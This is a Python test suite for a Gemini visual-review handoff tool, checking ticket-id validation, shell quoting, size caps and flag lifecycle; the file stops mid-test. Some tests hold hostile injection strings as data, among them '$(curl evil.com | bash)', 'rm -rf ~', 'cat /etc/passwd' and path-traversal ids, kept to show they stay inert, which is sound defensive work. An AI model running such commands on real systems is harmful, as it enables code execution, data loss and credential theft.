"""T-OSN-W7-GEMINI-02 — GeminiHandoff test suite.

Plan B: manual handoff/ingest infrastructure for Gemini visual review.

Security coverage (per ticket § 보안 의무 — PoC + variants 2+ for each check):
1. shlex.quote — stdout never contains raw shell metacharacters from prompt/path
2. ticket_id regex — invalid ids rejected before any file I/O
3. ingest length cap — responses > 100 KB rejected
4. ingest no eval — stored as plain text only, never executed
5. path traversal via ticket_id — flag file path cannot escape devos/state/
6. flag lifecycle — flag created on handoff, removed on ingest

Guideline from T-OSN-W7-GEMINI-01 retro: every security check has 1 PoC + 2+ variants.
"""

from __future__ import annotations

import os
import sys
from io import StringIO
from pathlib import Path
from unittest.mock import patch

import pytest

from server.gemini_handoff import (
    GeminiHandoff,
    HandoffError,
    IngestError,
    INGEST_MAX_BYTES,
)
from server._ticket_id import (
    TicketIdError,
    validate_ticket_id as _validate_ticket_id,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture()
def project_root(tmp_path: Path) -> Path:
    """Minimal project root with required directories."""
    (tmp_path / ".cache").mkdir()
    (tmp_path / "devos" / "logs" / "gemini").mkdir(parents=True)
    (tmp_path / "devos" / "state").mkdir(parents=True)
    (tmp_path / "devos" / "tasks").mkdir(parents=True)
    return tmp_path


@pytest.fixture()
def handoff(project_root: Path) -> GeminiHandoff:
    return GeminiHandoff(project_root=project_root)



# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

def test_ingest_max_bytes_is_100kb():
    """INGEST_MAX_BYTES must be exactly 100 * 1024."""
    assert INGEST_MAX_BYTES == 100 * 1024


# ---------------------------------------------------------------------------
# ticket_id validation
# ---------------------------------------------------------------------------

def test_valid_ticket_id_passes():
    """Standard ticket IDs pass regex."""
    _validate_ticket_id("T-OSN-W7-GEMINI-02")


def test_valid_ticket_id_simple_passes():
    _validate_ticket_id("T-PROJ-01")


def test_valid_ticket_id_all_digits_passes():
    _validate_ticket_id("T-A0B1C2")


# PoC: path traversal via ticket_id
def test_invalid_ticket_id_path_traversal_rejected():
    """ticket_id with path traversal sequence must be rejected."""
    with pytest.raises(TicketIdError, match="ticket_id"):
        _validate_ticket_id("T-../etc/passwd")


# Variant 1: slash in ticket id
def test_invalid_ticket_id_with_slash_rejected():
    with pytest.raises(TicketIdError):
        _validate_ticket_id("T-PROJ/EVIL")


# Variant 2: lowercase ticket id (must use uppercase)
def test_invalid_ticket_id_lowercase_rejected():
    with pytest.raises(TicketIdError):
        _validate_ticket_id("t-proj-01")


# Variant 3: empty string
def test_invalid_ticket_id_empty_rejected():
    with pytest.raises(TicketIdError):
        _validate_ticket_id("")


# Variant 4: trailing dash
def test_invalid_ticket_id_trailing_dash_rejected():
    with pytest.raises(TicketIdError):
        _validate_ticket_id("T-PROJ-01-")


# Variant 5: no T- prefix
def test_invalid_ticket_id_no_prefix_rejected():
    with pytest.raises(TicketIdError):
        _validate_ticket_id("PROJ-01")


# ---------------------------------------------------------------------------
# W1 fix: sub-ticket id support (trailing lowercase letter)
# Previously gemini_handoff had regex without [a-z]? suffix — Plan B rejected
# sub-tickets like T-OSN-W7-GEMINI-01a on fallback. Unified via _ticket_id.py.
# ---------------------------------------------------------------------------

def test_valid_sub_ticket_id_lowercase_suffix_passes():
    """Sub-ticket ids with a trailing lowercase letter must pass (W1 fix)."""
    _validate_ticket_id("T-OSN-W7-GEMINI-01a")


def test_valid_sub_ticket_id_02b_passes():
    _validate_ticket_id("T-OSN-W5-02b")


def test_valid_sub_ticket_id_crosstest_passes():
    _validate_ticket_id("T-DUMMY-CROSSTEST-01")


# ---------------------------------------------------------------------------
# W3 fix: explicit negative test literals from review brief
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("bad", ["T-A-", "T-A--", "T-", "../etc"])
def test_invalid_ticket_id_explicit_negatives(bad: str):
    """Review brief literals must all be rejected (W3 fix)."""
    with pytest.raises(TicketIdError):
        _validate_ticket_id(bad)


# ---------------------------------------------------------------------------
# handoff() — basic output check
# ---------------------------------------------------------------------------

def test_handoff_creates_flag_file(handoff: GeminiHandoff, project_root: Path):
    """make handoff-gemini must create devos/state/gemini_pending_{T}.flag."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Review this screenshot",
            image_paths=[],
        )
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    assert flag.exists(), "Flag file must be created after handoff()"


def test_handoff_stdout_contains_key_guidance(handoff: GeminiHandoff):
    """stdout must include script path, next-step guidance, and flag path.

    R7 update: handoff() stdout now says 'python3 -m server.gemini_handoff next'
    (make gemini-* removed in R6). Asserts python CLI guidance, not Make targets.
    """
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Describe this UI",
            image_paths=[],
        )
    output = captured.getvalue()
    # Must mention script or gemini
    assert "gemini" in output.lower() or "script" in output.lower(), \
        "stdout must mention the script or gemini"
    # Must mention python3 CLI guidance (R7: make gemini-next replaced)
    assert "server.gemini_handoff" in output and "next" in output, \
        "stdout must include 'python3 -m server.gemini_handoff next' guidance (R7)"
    # Must NOT mention make gemini-* (R7 regression guard)
    assert "make gemini-next" not in output, \
        "stdout must not reference deprecated make gemini-next (R7 regression guard)"
    # Must mention the flag
    assert "flag" in output.lower() or "pending" in output.lower(), \
        "stdout must mention the pending flag"


def test_handoff_writes_sh_script_to_cache(handoff: GeminiHandoff, project_root: Path):
    """handoff must write .cache/gemini-handoff-{T}.sh rather than raw shell in stdout."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Review this",
            image_paths=[],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-W7-GEMINI-02.sh"
    assert script.exists(), ".sh script must be written to .cache/"
    content = script.read_text(encoding="utf-8")
    assert "gemini" in content


# ---------------------------------------------------------------------------
# B2 fix: script permissions must be 0o644 (not 0o755)
# Matches gemini_dispatcher.py -01a W3 parity; invoke via 'bash <path>'.
# ---------------------------------------------------------------------------

def test_handoff_script_permissions_are_0o644(handoff: GeminiHandoff, project_root: Path):
    """Script written to .cache/ must have 0o644 permissions (B2 fix)."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Check permissions",
            image_paths=[],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-W7-GEMINI-02.sh"
    import stat
    mode = script.stat().st_mode & 0o777
    assert mode == 0o644, (
        f"Script must have 0o644 permissions (B2 fix — -01a W3 parity), got {oct(mode)}"
    )


def test_handoff_script_not_executable_via_stat(handoff: GeminiHandoff, project_root: Path):
    """Script must NOT have any executable bits set (B2 variant)."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Test exec bit",
            image_paths=[],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-W7-GEMINI-02.sh"
    import stat
    mode = script.stat().st_mode
    exec_bits = stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH
    assert (mode & exec_bits) == 0, (
        "Script must not have executable bits set — invoke via 'bash <path>' (B2 fix)"
    )


# ---------------------------------------------------------------------------
# R5 queue-only: new CLI subcommands (pending / next / ingest-stdin)
# ---------------------------------------------------------------------------

def test_cli_pending_with_no_flags_prints_no_pending(project_root: Path):
    """pending subcommand with no flags must print 'no pending' message."""
    from server.gemini_handoff import _cli_main
    captured = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdout", captured),
    ):
        rc = _cli_main(["pending"])
    assert rc == 0, "pending must exit 0 even with no flags"
    output = captured.getvalue()
    assert "pending" in output.lower() or "no pending" in output.lower(), (
        "pending must print informational message"
    )


def test_cli_pending_lists_existing_flags(project_root: Path):
    """pending subcommand must list pending flag ticket_ids."""
    from server.gemini_handoff import _cli_main
    # Pre-create a flag
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-PENDING-01.flag"
    flag.write_text("pending\nticket=T-OSN-PENDING-01\n", encoding="utf-8")

    captured = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdout", captured),
    ):
        rc = _cli_main(["pending"])
    assert rc == 0
    output = captured.getvalue()
    assert "T-OSN-PENDING-01" in output, (
        "pending must list the pending ticket id"
    )


def test_cli_next_with_no_flags_prints_no_pending(project_root: Path):
    """next subcommand with no flags must print informational message (no crash)."""
    from server.gemini_handoff import _cli_main
    captured = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdout", captured),
    ):
        rc = _cli_main(["next"])
    assert rc == 0, "next must exit 0 when no pending tickets"
    output = captured.getvalue()
    assert "pending" in output.lower() or "no pending" in output.lower(), (
        "next must print informational message when no pending"
    )


def test_cli_next_picks_oldest_flag_and_writes_lock(project_root: Path):
    """next subcommand must select oldest pending flag and write active.lock."""
    import time
    from server.gemini_handoff import _cli_main, ACTIVE_LOCK_FILENAME
    state_dir = project_root / "devos" / "state"

    # Create two flags; make first one older
    flag1 = state_dir / "gemini_pending_T-OSN-NEXT-OLD.flag"
    flag2 = state_dir / "gemini_pending_T-OSN-NEXT-NEW.flag"
    flag1.write_text("pending\nticket=T-OSN-NEXT-OLD\n", encoding="utf-8")
    flag2.write_text("pending\nticket=T-OSN-NEXT-NEW\n", encoding="utf-8")
    # Make flag1 older
    old_mtime = time.time() - 3600
    os.utime(flag1, (old_mtime, old_mtime))

    captured = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdout", captured),
    ):
        rc = _cli_main(["next"])
    assert rc == 0, "next must exit 0"

    lock_path = state_dir / ACTIVE_LOCK_FILENAME
    assert lock_path.exists(), "active.lock must be created by next"
    lock_content = lock_path.read_text(encoding="utf-8")
    assert "T-OSN-NEXT-OLD" in lock_content, (
        "active.lock must contain the oldest pending ticket_id"
    )

    output = captured.getvalue()
    assert "T-OSN-NEXT-OLD" in output, (
        "next must print the selected ticket_id to stdout"
    )


def test_cli_ingest_stdin_without_lock_returns_error(project_root: Path):
    """ingest-stdin without active.lock must return nonzero and print error."""
    from server.gemini_handoff import _cli_main
    captured_err = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdin", StringIO("Some response")),
        patch("sys.stderr", captured_err),
    ):
        rc = _cli_main(["ingest-stdin"])
    assert rc != 0, "ingest-stdin without lock must return nonzero"
    err_output = captured_err.getvalue()
    assert "gemini-next" in err_output.lower() or "lock" in err_output.lower() or "active" in err_output.lower(), (
        "Error message must mention the lock or gemini-next"
    )


def test_cli_ingest_stdin_full_lifecycle(project_root: Path):
    """ingest-stdin: next writes lock → ingest-stdin stores log + cleans up."""
    import time
    from server.gemini_handoff import _cli_main, ACTIVE_LOCK_FILENAME
    state_dir = project_root / "devos" / "state"

    # Set up a pending flag
    flag = state_dir / "gemini_pending_T-OSN-LIFECYCLE-02.flag"
    flag.write_text("pending\nticket=T-OSN-LIFECYCLE-02\n", encoding="utf-8")

    # Run next to create lock
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdout", StringIO()),
    ):
        rc_next = _cli_main(["next"])
    assert rc_next == 0

    lock_path = state_dir / ACTIVE_LOCK_FILENAME
    assert lock_path.exists(), "active.lock must exist after next"

    # Run ingest-stdin
    captured_out = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdin", StringIO("Gemini review response text here.")),
        patch("sys.stdout", captured_out),
    ):
        rc_ingest = _cli_main(["ingest-stdin"])
    assert rc_ingest == 0, "ingest-stdin must succeed"

    # Flag and lock must be removed
    assert not flag.exists(), "Pending flag must be removed after ingest-stdin"
    assert not lock_path.exists(), "Active lock must be removed after ingest-stdin"

    # Log must be written
    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-LIFECYCLE-02.md"))
    assert logs, "Ingest log must be written"
    content = logs[0].read_text(encoding="utf-8")
    assert "Gemini review response text here" in content


def test_cli_ingest_stdin_stores_attack_payload_as_plain_text(project_root: Path):
    """ingest-stdin must store attack payload (shell commands) as plain text, not execute.

    R5 PoC: stdin-based attack channel. Even if user pastes $(touch /tmp/X) or
    `touch /tmp/X`, it must be stored verbatim as text — not evaluated.
    """
    from server.gemini_handoff import _cli_main, ACTIVE_LOCK_FILENAME
    state_dir = project_root / "devos" / "state"

    # Set up pending + active lock directly (skip next for isolation)
    flag = state_dir / "gemini_pending_T-OSN-STDIN-ATTACK.flag"
    flag.write_text("pending\nticket=T-OSN-STDIN-ATTACK\n", encoding="utf-8")
    lock_path = state_dir / ACTIVE_LOCK_FILENAME
    lock_path.write_text("T-OSN-STDIN-ATTACK\n", encoding="utf-8")

    attack_payload = "$(touch /tmp/R5_STDIN_RCE_PROOF)\n`touch /tmp/R5_STDIN_BACKTICK`\nNormal review text."
    sentinel1 = Path("/tmp/R5_STDIN_RCE_PROOF")
    sentinel2 = Path("/tmp/R5_STDIN_BACKTICK")
    # Clean up sentinels if they existed from a prior run
    sentinel1.unlink(missing_ok=True)
    sentinel2.unlink(missing_ok=True)

    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stdin", StringIO(attack_payload)),
        patch("sys.stdout", StringIO()),
    ):
        rc = _cli_main(["ingest-stdin"])
    assert rc == 0, "ingest-stdin must succeed even with attack payload in stdin"

    # Sentinels must NOT exist — plain text storage, no eval
    assert not sentinel1.exists(), (
        "R5 PoC FAIL: $(touch ...) in stdin was evaluated — plain text storage broken"
    )
    assert not sentinel2.exists(), (
        "R5 PoC FAIL: backtick in stdin was evaluated — plain text storage broken"
    )

    # Content must be stored verbatim
    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-STDIN-ATTACK.md"))
    assert logs, "Log must be written"
    content = logs[0].read_text(encoding="utf-8")
    assert "$(touch /tmp/R5_STDIN_RCE_PROOF)" in content, (
        "Attack payload must be stored verbatim as plain text"
    )


def test_cli_deprecated_handoff_env_subcommand_not_registered(project_root: Path):
    """handoff-env (R4 subcommand) must not be registered in R5 CLI.

    argparse raises SystemExit(2) for unknown subcommands — this is the
    expected behaviour confirming the subcommand is not registered.
    """
    from server.gemini_handoff import _cli_main
    captured_err = StringIO()
    # argparse calls sys.exit(2) on unknown subcommand — catch SystemExit
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stderr", captured_err),
        pytest.raises(SystemExit) as exc_info,
    ):
        _cli_main(["handoff-env"])
    # SystemExit code must be nonzero (2 is argparse default for invalid subcommand)
    assert exc_info.value.code != 0, (
        "Deprecated handoff-env subcommand must cause nonzero exit in R5"
    )


def test_cli_deprecated_ingest_env_subcommand_not_registered(project_root: Path):
    """ingest-env (R4 subcommand) must not be registered in R5 CLI.

    argparse raises SystemExit(2) for unknown subcommands.
    """
    from server.gemini_handoff import _cli_main
    captured_err = StringIO()
    with (
        patch.dict(os.environ, {"OS2_PROJECT_ROOT": str(project_root)}),
        patch("sys.stderr", captured_err),
        pytest.raises(SystemExit) as exc_info,
    ):
        _cli_main(["ingest-env"])
    assert exc_info.value.code != 0, (
        "Deprecated ingest-env subcommand must cause nonzero exit in R5"
    )


def test_handoff_stdout_contains_script_path_not_raw_command(
    handoff: GeminiHandoff, project_root: Path
):
    """stdout must reference the .sh script path, not inline unquoted shell command."""
    prompt_with_spaces = "Review the dark mode layout carefully"
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt=prompt_with_spaces,
            image_paths=[],
        )
    output = captured.getvalue()
    # The .sh script path should appear in stdout
    assert "gemini-handoff-T-OSN-W7-GEMINI-02.sh" in output, \
        "stdout must include the .sh script path"


# ---------------------------------------------------------------------------
# Security: shlex.quote — no raw metacharacters in stdout
# ---------------------------------------------------------------------------

# PoC: prompt with shell metacharacters
def test_handoff_prompt_with_shell_metachar_not_in_raw_stdout(
    handoff: GeminiHandoff, project_root: Path
):
    """Prompt with shell metacharacters must not appear unquoted in stdout.

    The .sh file may contain quoted versions but stdout must only show the script path.
    If the dangerous prompt were in stdout, a copy-paste user could trigger shell injection.
    """
    evil_prompt = "Review this; rm -rf ~"
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt=evil_prompt,
            image_paths=[],
        )
    output = captured.getvalue()
    # The raw unquoted dangerous string must NOT appear verbatim in stdout
    assert "rm -rf ~" not in output, \
        "Raw shell metacharacters from prompt must not appear unquoted in stdout"


# Variant 1: backtick injection
def test_handoff_prompt_backtick_not_in_raw_stdout(handoff: GeminiHandoff):
    evil_prompt = "Review this `cat /etc/passwd`"
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt=evil_prompt,
            image_paths=[],
        )
    output = captured.getvalue()
    assert "cat /etc/passwd" not in output, \
        "Backtick injection must not appear unquoted in stdout"


# Variant 2: $() substitution injection
def test_handoff_prompt_dollar_subshell_not_in_raw_stdout(handoff: GeminiHandoff):
    evil_prompt = "Review $(curl evil.com | bash)"
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt=evil_prompt,
            image_paths=[],
        )
    output = captured.getvalue()
    assert "curl evil.com | bash" not in output, \
        "$(subshell) injection must not appear unquoted in stdout"


# PoC: image path with shell metacharacters
def test_handoff_image_path_with_metachar_quoted_in_script(
    handoff: GeminiHandoff, project_root: Path
):
    """Image paths with shell metacharacters must be quoted in the .sh script.

    shlex.quote wraps paths containing spaces in single quotes, e.g.:
      '@/tmp/.../screenshot with spaces.png'
    becomes:
      "'@/tmp/.../screenshot with spaces.png'"
    So the unquoted substring "screenshot with spaces.png" must not appear
    outside of a quoted context (i.e., without surrounding single quotes).
    """
    safe_name = "screenshot with spaces.png"
    img = project_root / ".cache" / safe_name
    img.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 100)

    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Review UI",
            image_paths=[str(img)],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-W7-GEMINI-02.sh"
    script_content = script.read_text(encoding="utf-8")

    # shlex.quote wraps the whole @/path token in single quotes when it contains spaces.
    # Verify: the unquoted token (with a space before the filename and no surrounding quotes)
    # must NOT appear. The path must only appear inside single-quote delimiters.
    # We strip all single-quoted tokens and check the remainder doesn't contain the name.
    import re as _re
    # Remove all single-quoted substrings (the properly quoted paths)
    unquoted_remainder = _re.sub(r"'[^']*'", "", script_content)
    assert "screenshot with spaces.png" not in unquoted_remainder, \
        "Image path with spaces must be wrapped in shlex.quote (single quotes) in the .sh script"


# ---------------------------------------------------------------------------
# Security: flag file path traversal guard
# ---------------------------------------------------------------------------

def test_handoff_invalid_ticket_id_does_not_create_flag(
    handoff: GeminiHandoff, project_root: Path
):
    """Invalid ticket_id must raise HandoffError; no flag file created."""
    with pytest.raises((HandoffError, TicketIdError)):
        handoff.handoff(
            ticket_id="T-../evil",
            prompt="test",
            image_paths=[],
        )
    # No flag file should exist
    state_dir = project_root / "devos" / "state"
    flags = list(state_dir.glob("*.flag"))
    assert not flags, "No flag file must be created for invalid ticket_id"


# Variant: ticket_id with null byte
def test_handoff_ticket_id_null_byte_rejected(handoff: GeminiHandoff):
    with pytest.raises((HandoffError, TicketIdError)):
        handoff.handoff(
            ticket_id="T-PROJ\x00EVIL",
            prompt="test",
            image_paths=[],
        )


# ---------------------------------------------------------------------------
# ingest() — success path
# ---------------------------------------------------------------------------

def test_ingest_creates_log_file(handoff: GeminiHandoff, project_root: Path):
    """ingest() must write devos/logs/gemini/{date}-{T}.md."""
    # Create flag first
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    response_text = "This looks good. The layout is clean."
    handoff.ingest(
        ticket_id="T-OSN-W7-GEMINI-02",
        response=response_text,
    )

    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-W7-GEMINI-02.md"))
    assert len(logs) == 1, f"Expected exactly 1 log file, found: {logs}"
    content = logs[0].read_text(encoding="utf-8")
    assert "This looks good" in content


def test_ingest_removes_flag_file(handoff: GeminiHandoff, project_root: Path):
    """ingest() must remove the pending flag after storing the response."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    handoff.ingest(
        ticket_id="T-OSN-W7-GEMINI-02",
        response="All good.",
    )

    assert not flag.exists(), "Flag file must be removed after successful ingest()"


def test_ingest_log_contains_ticket_id(handoff: GeminiHandoff, project_root: Path):
    """Log file must contain the ticket ID for traceability."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    handoff.ingest(
        ticket_id="T-OSN-W7-GEMINI-02",
        response="Review complete.",
    )

    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-OSN-W7-GEMINI-02.md"))
    content = logs[0].read_text(encoding="utf-8")
    assert "T-OSN-W7-GEMINI-02" in content


# ---------------------------------------------------------------------------
# Security: ingest length cap 100 KB
# ---------------------------------------------------------------------------

# PoC: exactly 100 KB + 1 byte rejected
def test_ingest_rejects_response_over_100kb(handoff: GeminiHandoff, project_root: Path):
    """Response > 100 KB must be rejected with IngestError."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    oversized = "A" * (100 * 1024 + 1)
    with pytest.raises(IngestError, match="100"):
        handoff.ingest(
            ticket_id="T-OSN-W7-GEMINI-02",
            response=oversized,
        )


# Variant 1: exactly 100 KB passes (boundary condition)
def test_ingest_accepts_response_exactly_100kb(handoff: GeminiHandoff, project_root: Path):
    """Response of exactly 100 KB must be accepted."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    exactly_100kb = "B" * (100 * 1024)
    # Must not raise
    handoff.ingest(
        ticket_id="T-OSN-W7-GEMINI-02",
        response=exactly_100kb,
    )


# Variant 2: massively oversized (simulate paste mistake)
def test_ingest_rejects_very_large_response(handoff: GeminiHandoff, project_root: Path):
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    oversized = "C" * (1024 * 1024)  # 1 MB
    with pytest.raises(IngestError, match="100"):
        handoff.ingest(
            ticket_id="T-OSN-W7-GEMINI-02",
            response=oversized,
        )


# ---------------------------------------------------------------------------
# W5 fix: boundary tests — 100KB-1 accept and empty string reject
# ---------------------------------------------------------------------------

def test_ingest_accepts_response_99999_bytes(handoff: GeminiHandoff, project_root: Path):
    """Response of 99999 bytes (100KB - 1) must be accepted (W5 fix lower boundary)."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    just_under = "D" * 99999
    # Must not raise — 99999 bytes is within the 100 KB cap
    handoff.ingest(
        ticket_id="T-OSN-W7-GEMINI-02",
        response=just_under,
    )


def test_ingest_rejects_empty_response(handoff: GeminiHandoff, project_root: Path):
    """Empty response string must be rejected with IngestError (W5 fix — user paste omission).

    An empty response signals the user forgot to paste the Gemini output.
    Storing an empty log file creates a misleading 'complete' state.
    """
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    flag.write_text("pending", encoding="utf-8")

    with pytest.raises(IngestError, match="empty"):
        handoff.ingest(
            ticket_id="T-OSN-W7-GEMINI-02",
            response="",
        )


# ---------------------------------------------------------------------------
# Security: ingest stores plain text only (no eval/exec)
# ---------------------------------------------------------------------------

# PoC: response containing shell command snippet is stored as text, not executed
def test_ingest_stores_shell_command_as_text(handoff: GeminiHandoff, project_root: Path):
    """Response containing shell commands must be stored as plain text, never executed."""
    flag = project_root / "devos" / "state" / "gemini_pending_T-EVIL-CMD.flag"
    flag.write_text("pending", encoding="utf-8")

    # This would do damage if eval'd, but must be stored as plain text
    evil_response = "The review looks good.\n```bash\nrm -rf /tmp/test\n```\n"

    # Must not raise and must not execute anything — we verify by checking the file
    handoff.ingest(
        ticket_id="T-EVIL-CMD",
        response=evil_response,
    )

    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-EVIL-CMD.md"))
    assert len(logs) == 1
    content = logs[0].read_text(encoding="utf-8")
    # Content stored verbatim
    assert "rm -rf /tmp/test" in content


# Variant 1: Python exec() snippet in response
def test_ingest_stores_python_exec_as_text(handoff: GeminiHandoff, project_root: Path):
    flag = project_root / "devos" / "state" / "gemini_pending_T-EVIL-PY.flag"
    flag.write_text("pending", encoding="utf-8")

    python_response = "Suggestion: exec('import os; os.system(\"id\")')"
    handoff.ingest(
        ticket_id="T-EVIL-PY",
        response=python_response,
    )
    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-EVIL-PY.md"))
    content = logs[0].read_text(encoding="utf-8")
    assert "exec(" in content  # stored verbatim as text


# Variant 2: @./ file-token pattern in response (stored, not evaluated)
def test_ingest_stores_at_token_as_text(handoff: GeminiHandoff, project_root: Path):
    flag = project_root / "devos" / "state" / "gemini_pending_T-AT-TOKEN.flag"
    flag.write_text("pending", encoding="utf-8")

    at_response = "Some context @./secrets.env should be read"
    handoff.ingest(
        ticket_id="T-AT-TOKEN",
        response=at_response,
    )
    log_dir = project_root / "devos" / "logs" / "gemini"
    logs = list(log_dir.glob("*T-AT-TOKEN.md"))
    content = logs[0].read_text(encoding="utf-8")
    assert "@./secrets.env" in content  # stored verbatim


# ---------------------------------------------------------------------------
# ingest() — missing flag error
# ---------------------------------------------------------------------------

def test_ingest_without_flag_raises(handoff: GeminiHandoff, project_root: Path):
    """ingest() without a prior handoff() (no flag) must raise IngestError."""
    with pytest.raises(IngestError, match="flag"):
        handoff.ingest(
            ticket_id="T-OSN-W7-GEMINI-02",
            response="some response",
        )


def test_ingest_invalid_ticket_id_rejected(handoff: GeminiHandoff):
    """ingest() with invalid ticket_id must raise before file I/O."""
    with pytest.raises((IngestError, TicketIdError)):
        handoff.ingest(
            ticket_id="T-../evil",
            response="some response",
        )


# ---------------------------------------------------------------------------
# flag lifecycle: handoff → ingest removes flag
# ---------------------------------------------------------------------------

def test_flag_lifecycle_complete(handoff: GeminiHandoff, project_root: Path):
    """Full lifecycle: handoff creates flag, ingest removes it."""
    ticket_id = "T-OSN-LIFECYCLE-01"

    # Step 1: handoff creates flag
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id=ticket_id,
            prompt="Describe this UI layout",
            image_paths=[],
        )

    flag = project_root / "devos" / "state" / f"gemini_pending_{ticket_id}.flag"
    assert flag.exists(), "Flag must exist after handoff()"

    # Step 2: ingest removes flag
    handoff.ingest(
        ticket_id=ticket_id,
        response="The layout looks clean.",
    )
    assert not flag.exists(), "Flag must be gone after ingest()"


# ---------------------------------------------------------------------------
# devos/state/ auto-creation
# ---------------------------------------------------------------------------

def test_handoff_creates_state_dir_if_missing(tmp_path: Path):
    """devos/state/ must be auto-created if absent (no crash)."""
    (tmp_path / ".cache").mkdir()
    (tmp_path / "devos" / "logs" / "gemini").mkdir(parents=True)
    # Intentionally NOT creating devos/state/

    h = GeminiHandoff(project_root=tmp_path)
    captured = StringIO()
    with patch("sys.stdout", captured):
        h.handoff(
            ticket_id="T-AUTODIR-01",
            prompt="test",
            image_paths=[],
        )
    assert (tmp_path / "devos" / "state").exists()


# ---------------------------------------------------------------------------
# Duplicate handoff: second call overwrites flag (idempotent)
# ---------------------------------------------------------------------------

def test_handoff_idempotent_second_call_allowed(handoff: GeminiHandoff, project_root: Path):
    """Calling handoff() twice for same ticket_id is allowed (flag overwritten)."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="first call",
            image_paths=[],
        )
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="second call",
            image_paths=[],
        )
    flag = project_root / "devos" / "state" / "gemini_pending_T-OSN-W7-GEMINI-02.flag"
    assert flag.exists()


# ---------------------------------------------------------------------------
# Integration: handoff() dispatched_by field in script
# ---------------------------------------------------------------------------

def test_handoff_script_contains_model_reference(handoff: GeminiHandoff, project_root: Path):
    """The .sh script must reference the gemini model for CLI invocation."""
    captured = StringIO()
    with patch("sys.stdout", captured):
        handoff.handoff(
            ticket_id="T-OSN-W7-GEMINI-02",
            prompt="Review UI",
            image_paths=[],
        )
    script = project_root / ".cache" / "gemini-handoff-T-OSN-W7-GEMINI-02.sh"
    content = script.read_text(encoding="utf-8")
    # Must reference some gemini model
    assert "gemini" in content.lower()
    assert "-m" in content or "--model" in content


# ---------------------------------------------------------------------------
# W-NEW-1: UTC timestamps — all 4 sites must include +00:00 (R3 fix)
# ---------------------------------------------------------------------------

def test_handoff_flag_timestamp_is_utc(handoff: GeminiHandoff, project_root: Path):
